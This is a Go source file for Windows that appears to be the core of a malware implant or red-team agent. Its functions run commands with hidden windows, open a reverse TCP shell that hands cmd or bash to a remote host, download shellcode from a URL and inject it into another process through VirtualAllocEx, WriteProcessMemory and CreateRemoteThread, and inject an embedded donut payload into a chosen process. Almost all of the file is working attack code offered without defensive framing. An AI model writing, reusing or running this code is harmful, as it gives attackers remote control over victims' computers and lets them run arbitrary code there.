// +build windows
package main

import (
	_ "embed"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

/////
const (
	ERROR_NOT_ALL_ASSIGNED syscall.Errno = 1300

	SecurityAnonymous      = 0
	SecurityIdentification = 1
	SecurityImpersonation  = 2
	SecurityDelegation     = 3

	// Integrity Levels
	SECURITY_MANDATORY_UNTRUSTED_RID         = 0x00000000
	SECURITY_MANDATORY_LOW_RID               = 0x00001000
	SECURITY_MANDATORY_MEDIUM_RID            = 0x00002000
	SECURITY_MANDATORY_HIGH_RID              = 0x00003000
	SECURITY_MANDATORY_SYSTEM_RID            = 0x00004000
	SECURITY_MANDATORY_PROTECTED_PROCESS_RID = 0x00005000

	SE_PRIVILEGE_ENABLED_BY_DEFAULT uint32 = 0x00000001
	SE_PRIVILEGE_ENABLED            uint32 = 0x00000002
	SE_PRIVILEGE_REMOVED            uint32 = 0x00000004
	SE_PRIVILEGE_USED_FOR_ACCESS    uint32 = 0x80000000

	SE_ASSIGNPRIMARYTOKEN_NAME                = "SeAssignPrimaryTokenPrivilege"
	SE_AUDIT_NAME                             = "SeAuditPrivilege"
	SE_BACKUP_NAME                            = "SeBackupPrivilege"
	SE_CHANGE_NOTIFY_NAME                     = "SeChangeNotifyPrivilege"
	SE_CREATE_GLOBAL_NAME                     = "SeCreateGlobalPrivilege"
	SE_CREATE_PAGEFILE_NAME                   = "SeCreatePagefilePrivilege"
	SE_CREATE_PERMANENT_NAME                  = "SeCreatePermanentPrivilege"
	SE_CREATE_SYMBOLIC_LINK_NAME              = "SeCreateSymbolicLinkPrivilege"
	SE_CREATE_TOKEN_NAME                      = "SeCreateTokenPrivilege"
	SE_DEBUG_NAME                             = "SeDebugPrivilege"
	SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME = "SeDelegateSessionUserImpersonatePrivilege"
	SE_ENABLE_DELEGATION_NAME                 = "SeEnableDelegationPrivilege"
	SE_IMPERSONATE_NAME                       = "SeImpersonatePrivilege"
	SE_INC_BASE_PRIORITY_NAME                 = "SeIncreaseBasePriorityPrivilege"
	SE_INCREASE_QUOTA_NAME                    = "SeIncreaseQuotaPrivilege"
	SE_INC_WORKING_SET_NAME                   = "SeIncreaseWorkingSetPrivilege"
	SE_LOAD_DRIVER_NAME                       = "SeLoadDriverPrivilege"
	SE_LOCK_MEMORY_NAME                       = "SeLockMemoryPrivilege"
	SE_MACHINE_ACCOUNT_NAME                   = "SeMachineAccountPrivilege"
	SE_MANAGE_VOLUME_NAME                     = "SeManageVolumePrivilege"
	SE_PROF_SINGLE_PROCESS_NAME               = "SeProfileSingleProcessPrivilege"
	SE_RELABEL_NAME                           = "SeRelabelPrivilege"
	SE_REMOTE_SHUTDOWN_NAME                   = "SeRemoteShutdownPrivilege"
	SE_RESTORE_NAME                           = "SeRestorePrivilege"

	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000
	MEM_RELEASE = 0x8000

	PROCESS_CREATE_PROCESS            = 0x0080
	PROCESS_CREATE_THREAD             = 0x0002
	PROCESS_DUP_HANDLE                = 0x0040
	PROCESS_QUERY_INFORMATION         = 0x0400
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	PROCESS_SET_INFORMATION           = 0x0200
	PROCESS_SET_QUOTA                 = 0x0100
	PROCESS_SUSPEND_RESUME            = 0x0800
	PROCESS_TERMINATE                 = 0x0001
	PROCESS_VM_OPERATION              = 0x0008
	PROCESS_VM_READ                   = 0x0010
	PROCESS_VM_WRITE                  = 0x0020
	PROCESS_ALL_ACCESS                = 0x001F0FFF

	CREATE_SUSPENDED = 0x00000004

	SIZE     = 64 * 1024
	INFINITE = 0xFFFFFFFF

	PAGE_NOACCESS          = 0x00000001
	PAGE_READONLY          = 0x00000002
	PAGE_READWRITE         = 0x00000004
	PAGE_WRITECOPY         = 0x00000008
	PAGE_EXECUTE           = 0x00000010
	PAGE_EXECUTE_READ      = 0x00000020
	PAGE_EXECUTE_READWRITE = 0x00000040
	PAGE_EXECUTE_WRITECOPY = 0x00000080
	PAGE_GUARD             = 0x00000100
	PAGE_NOCACHE           = 0x00000200
	PAGE_WRITECOMBINE      = 0x00000400

	DELETE                   = 0x00010000
	READ_CONTROL             = 0x00020000
	WRITE_DAC                = 0x00040000
	WRITE_OWNER              = 0x00080000
	SYNCHRONIZE              = 0x00100000
	STANDARD_RIGHTS_READ     = READ_CONTROL
	STANDARD_RIGHTS_WRITE    = READ_CONTROL
	STANDARD_RIGHTS_EXECUTE  = READ_CONTROL
	STANDARD_RIGHTS_REQUIRED = DELETE | READ_CONTROL | WRITE_DAC | WRITE_OWNER
	STANDARD_RIGHTS_ALL      = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE

	TOKEN_ASSIGN_PRIMARY    = 0x0001
	TOKEN_DUPLICATE         = 0x0002
	TOKEN_IMPERSONATE       = 0x0004
	TOKEN_QUERY             = 0x0008
	TOKEN_QUERY_SOURCE      = 0x0010
	TOKEN_ADJUST_PRIVILEGES = 0x0020
	TOKEN_ADJUST_GROUPS     = 0x0040
	TOKEN_ADJUST_DEFAULT    = 0x0080
	TOKEN_ADJUST_SESSIONID  = 0x0100
	TOKEN_ALL_ACCESS        = (STANDARD_RIGHTS_REQUIRED |
		TOKEN_ASSIGN_PRIMARY |
		TOKEN_DUPLICATE |
		TOKEN_IMPERSONATE |
		TOKEN_QUERY |
		TOKEN_QUERY_SOURCE |
		TOKEN_ADJUST_PRIVILEGES |
		TOKEN_ADJUST_GROUPS |
		TOKEN_ADJUST_DEFAULT |
		TOKEN_ADJUST_SESSIONID)
)

var (
	ModKernel32             = syscall.NewLazyDLL("kernel32.dll")
	ProcVirtualAlloc        = ModKernel32.NewProc("VirtualAlloc")
	ProcCreateThread        = ModKernel32.NewProc("CreateThread")
	ProcWaitForSingleObject = ModKernel32.NewProc("WaitForSingleObject")
	ProcVirtualAllocEx      = ModKernel32.NewProc("VirtualAllocEx")
	ProcVirtualFreeEx       = ModKernel32.NewProc("VirtualFreeEx")
	ProcCreateRemoteThread  = ModKernel32.NewProc("CreateRemoteThread")
	ProcGetLastError        = ModKernel32.NewProc("GetLastError")
	ProcWriteProcessMemory  = ModKernel32.NewProc("WriteProcessMemory")
	ProcOpenProcess         = ModKernel32.NewProc("OpenProcess")
	ProcGetCurrentProcess   = ModKernel32.NewProc("GetCurrentProcess")
	ProcIsDebuggerPresent   = ModKernel32.NewProc("IsDebuggerPresent")
	ProcGetProcAddress      = ModKernel32.NewProc("GetProcAddress")
	ProcCloseHandle         = ModKernel32.NewProc("CloseHandle")
	ProcGetExitCodeThread   = ModKernel32.NewProc("GetExitCodeThread")
	NullRef                 int
)

//go:embed payload.donut.bin
var rawDonutPayload []byte

func ExecuteCommand(command string) (string, error) {
	fullCmd := strings.Split(command, " ")
	if runtime.GOOS == "windows" {
		cmd := exec.Command(fullCmd[0], fullCmd[1:]...)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true, // only difference between windows and linux
		}
		output, err := cmd.Output()
		if err != nil {
			log.Printf("Failed task")
			return fmt.Sprintf("::: Failed :::\n%s", command), err
		}
		commandOutput := strings.TrimSuffix(string(output), "\n")
		return fmt.Sprintf("::: Success :::\n%s", commandOutput), nil
	} else {
		output, err := exec.Command(fullCmd[0], fullCmd[1:]...).Output()
		if err != nil {
			log.Printf("Failed task")
			return fmt.Sprintf("::: Failed :::\n%s", command), err
		}
		commandOutput := strings.TrimSuffix(string(output), "\n")
		return fmt.Sprintf("::: Success :::\n%s", commandOutput), nil
	}
}

func ReverseTcpShell(ip string, port string) {
	log.Println(ip + ":" + port)
	GoSock, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		log.Printf("Failed to create socket %v", err)
		return
	}
	defer GoSock.Close()
	if runtime.GOOS == "windows" {
		cmdProc := exec.Command("cmd")
		cmdProc.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true, // // only difference between windows and linux
		}
		cmdProc.Stderr = GoSock
		cmdProc.Stdout = GoSock
		cmdProc.Stdin = GoSock
		cmdProc.Run()
	} else {
		bashProc := exec.Command("/bin/bash")
		bashProc.Stderr = GoSock
		bashProc.Stdout = GoSock
		bashProc.Stdin = GoSock
		bashProc.Run()
	}
}

func ClassicInjection(targetPid string, shellcodeUrl string) error {
	targetPidInt, err := strconv.Atoi(targetPid)
	if err != nil {
		return err
	}
	resp, err := http.Get(shellcodeUrl)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	rawBytesShellcode, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	pid := targetPidInt
	hexShellCode := hex.EncodeToString(rawBytesShellcode)
	shellcode, errShellcode := hex.DecodeString(hexShellCode)
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}
	shellcodeLen := len(shellcode)
	var rights uint32 = PROCESS_CREATE_THREAD |
		PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE |
		PROCESS_VM_READ
	var inheritHandle uint32 = 0
	remoteProcHandle, _, lastErr := ProcOpenProcess.Call(
		uintptr(rights),
		uintptr(inheritHandle),
		uintptr(uint32(pid)))
	if remoteProcHandle == 0 {
		fmt.Printf("%v\n", lastErr)
		return lastErr
	}
	var flAllocationType uint32 = MEM_COMMIT | MEM_RESERVE
	var flProtect uint32 = PAGE_EXECUTE_READWRITE
	lpBaseAddress, _, lastErr := ProcVirtualAllocEx.Call(
		remoteProcHandle,
		uintptr(NullRef),
		uintptr(shellcodeLen),
		uintptr(flAllocationType),
		uintptr(flProtect))
	if lpBaseAddress == 0 {
		fmt.Printf("%v\n", lastErr)
		return lastErr
	}
	var nBytesWritten *byte
	if err != nil {
		return err
	}
	writeMem, _, lastErr := ProcWriteProcessMemory.Call(
		remoteProcHandle,
		lpBaseAddress,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(shellcodeLen),
		uintptr(unsafe.Pointer(nBytesWritten)))
	if writeMem == 0 {
		return err
	}
	var threadId uint32 = 0
	var dwCreationFlags uint32 = 0
	remoteThread, _, lastErr := ProcCreateRemoteThread.Call(
		remoteProcHandle,
		uintptr(NullRef),
		uintptr(0),
		lpBaseAddress,
		uintptr(NullRef),
		uintptr(dwCreationFlags),
		uintptr(unsafe.Pointer(&threadId)),
	)
	if remoteThread == 0 {
		return err
	}
	fmt.Printf("[+] Inject Complete\n")
	return nil
}

func Migrate(targetPid string) error {
	rawBytesShellcode := rawDonutPayload
	targetPidInt, err := strconv.Atoi(targetPid)
	if err != nil {
		return err
	}
	pid := targetPidInt
	hexShellCode := hex.EncodeToString(rawBytesShellcode)
	shellcode, errShellcode := hex.DecodeString(hexShellCode)
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}
	shellcodeLen := len(shellcode)
	var rights uint32 = PROCESS_CREATE_THREAD |
		PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE |
		PROCESS_VM_READ
	var inheritHandle uint32 = 0
	remoteProcHandle, _, lastErr := ProcOpenProcess.Call(
		uintptr(rights),
		uintptr(inheritHandle),
		uintptr(uint32(pid)))
	if remoteProcHandle == 0 {
		fmt.Printf("%v\n", lastErr)
		return lastErr
	}
	var flAllocationType uint32 = MEM_COMMIT | MEM_RESERVE
	var flProtect uint32 = PAGE_EXECUTE_READWRITE
	lpBaseAddress, _, lastErr := ProcVirtualAllocEx.Call(
		remoteProcHandle,
		uintptr(NullRef),
		uintptr(shellcodeLen),
		uintptr(flAllocationType),
		uintptr(flProtect))
	if lpBaseAddress == 0 {
		fmt.Printf("%v\n", lastErr)
		return lastErr
	}
	var nBytesWritten *byte
	if err != nil {
		return err
	}
	writeMem, _, lastErr := ProcWriteProcessMemory.Call(
		remoteProcHandle,
		lpBaseAddress,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(shellcodeLen),
		uintptr(unsafe.Pointer(nBytesWritten)))
	if writeMem == 0 {
		return err
	}
	var threadId uint32 = 0
	var dwCreationFlags uint32 = 0
	remoteThread, _, lastErr := ProcCreateRemoteThread.Call(
		remoteProcHandle,
		uintptr(NullRef),
		uintptr(0),
		lpBaseAddress,
		uintptr(NullRef),
		uintptr(dwCreationFlags),
		uintptr(unsafe.Pointer(&threadId)),
	)
	if remoteThread == 0 {
		return err
	}
	fmt.Printf("[+] Migrate Complete\n")
	return nil
}
